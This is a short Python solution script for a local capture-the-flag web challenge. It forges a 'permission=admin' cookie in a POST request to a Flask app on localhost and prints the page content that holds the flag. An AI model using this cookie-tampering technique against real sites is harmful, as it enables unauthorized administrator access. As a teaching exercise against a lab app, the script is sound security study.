#!/usr/bin/env python3

'''
If you are not in linux (ubuntu in my case)
remove the first line (called shebang) and run the code with
python3 exploit-web.py

if you are in ubuntu, the script probably works with
chmod 755 exploit-crypto1.py
./exploit-web.py
'''

import requests

'''
without using the browser development tool, you can send a request with the right cookie to the page
You can infer the cookie looking at the request when you enter the index page
There is the cookie permission=user
So the first thing to test is the permission=admin
'''

# url in flask, it is in the description
url = "http://127.0.0.1:5000/"

# set the header
headers = {"Cookie": "permission=admin"}

# set the data for the post request
data = {"name": "test",
        "passwd": "test"
    } 

# send the request and get the response
response = requests.post(url, headers=headers, data=data)
 
print("Status Code", response.status_code)
# you can see the flag in the content of the response
print(response.content)

